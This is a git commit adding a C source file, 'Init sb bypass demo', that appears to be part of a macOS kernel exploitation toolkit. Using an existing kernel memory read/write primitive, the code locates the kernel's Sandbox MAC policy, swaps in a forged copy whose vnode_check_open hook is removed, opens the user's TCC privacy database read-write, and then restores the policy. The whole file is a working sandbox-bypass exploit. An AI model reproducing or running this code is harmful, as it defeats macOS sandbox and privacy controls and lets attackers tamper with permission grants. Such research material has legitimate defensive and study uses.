8dcc50c52fa8e44cd1dfe0aa7ad029013983c2fe
Sreejith Krishnan R <hello.sreejith@pm.me>
2022-01-11 07:29:55 -0800

    Init sb bypass demo

---
+++ demo_sb/demo_sb/main.c
@@ -0,0 +1,98 @@
+//
+//  main.c
+//  demo_sb
+//
+//  Created by user on 1/7/22.
+//
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <limits.h>
+
+#include <sys/fcntl.h>
+#include <sys/errno.h>
+
+#include "kmem.h"
+#include "kmem_remote.h"
+#include "slider.h"
+#include "util_log.h"
+#include "util_assert.h"
+#include "allocator_pipe.h"
+#include "util_binary.h"
+
+
+int find_mac_policy_conf(char* mpc_name, uintptr_t* out, int* index_out) {
+    uintptr_t mac_policy_list = xe_slider_slide(VAR_MAC_POLICY_LIST);
+    
+    uint maxindex = xe_kmem_read_uint32(KMEM_OFFSET(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_MAXINDEX_OFFSET));
+    uintptr_t entries = xe_kmem_read_uint64(KMEM_OFFSET(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_ENTRIES_OFFSET));
+    
+    for (int i=0; i<maxindex; i++) {
+        uintptr_t entry = entries + i * 8;
+        uintptr_t mpc = xe_kmem_read_uint64(entry);
+        char name[16];
+        bzero(name, sizeof(name));
+        xe_kmem_read(name, xe_kmem_read_uint64(KMEM_OFFSET(mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_NAME_OFFSET)), sizeof(name));
+        
+        if (strncmp(mpc_name, name, sizeof(name)) == 0) {
+            *out = mpc;
+            if (index_out) { *index_out = i; };
+            return 0;
+        }
+    }
+    
+    return ENOENT;
+}
+
+
+int main(int argc, const char * argv[]) {
+    xe_assert_cond(argc, ==, 2);
+    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
+    xe_kmem_use_backend(backend);
+    xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
+    
+    uintptr_t mac_policy_list = xe_slider_slide(VAR_MAC_POLICY_LIST);
+    uintptr_t mac_policy_entries = xe_kmem_read_uint64(KMEM_OFFSET(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_ENTRIES_OFFSET));
+
+    xe_allocator_pipe_t fake_mpc_allocator;
+    uintptr_t fake_mpc;
+    int error = xe_allocator_pipe_allocate(TYPE_MAC_POLICY_CONF_SIZE, &fake_mpc_allocator, &fake_mpc);
+    xe_assert_err(error);
+
+    xe_allocator_pipe_t fake_mpo_allocator;
+    uintptr_t fake_mpo;
+    error = xe_allocator_pipe_allocate(TYPE_MAC_POLICY_OPS_SIZE, &fake_mpo_allocator, &fake_mpo);
+    xe_assert_err(error);
+
+    uintptr_t sandbox_mpc;
+    int sandbox_mpc_index;
+    error = find_mac_policy_conf("Sandbox", &sandbox_mpc, &sandbox_mpc_index);
+    xe_assert_err(error);
+
+    uintptr_t sandbox_mpo = xe_kmem_read_uint64(KMEM_OFFSET(sandbox_mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_OPS_OFFSET));
+
+    xe_kmem_copy(fake_mpc, sandbox_mpc, TYPE_MAC_POLICY_CONF_SIZE);
+    xe_kmem_copy(fake_mpo, sandbox_mpo, TYPE_MAC_POLICY_OPS_SIZE);
+    xe_kmem_write_uint64(KMEM_OFFSET(fake_mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_OPS_OFFSET), fake_mpo);
+    xe_kmem_write_uint64(KMEM_OFFSET(fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_OPEN_OFFSET), 0);
+    
+    xe_kmem_write_uint64(KMEM_OFFSET(mac_policy_entries, sizeof(uintptr_t) * sandbox_mpc_index), fake_mpc);
+    
+    xe_log_info("patched sandbox policy to skip vnode_open check");
+    
+    char* home = getenv("HOME");
+    char tcc_db[PATH_MAX];
+    snprintf(tcc_db, sizeof(tcc_db), "%s/Library/Application Support/com.apple.TCC/tcc.db", home);
+    int fd = open(tcc_db, O_RDWR);
+    if (fd < 0) {
+        xe_log_error("failed to open tcc.db, err: %s", strerror(errno));
+    } else {
+        xe_log_info("tcc.db open success");
+    }
+    
+    xe_log_info("restoring sandbox policy");
+    xe_kmem_write_uint64(KMEM_OFFSET(mac_policy_entries, sizeof(uintptr_t) * sandbox_mpc_index), sandbox_mpc);
+    
+    return 0;
+}
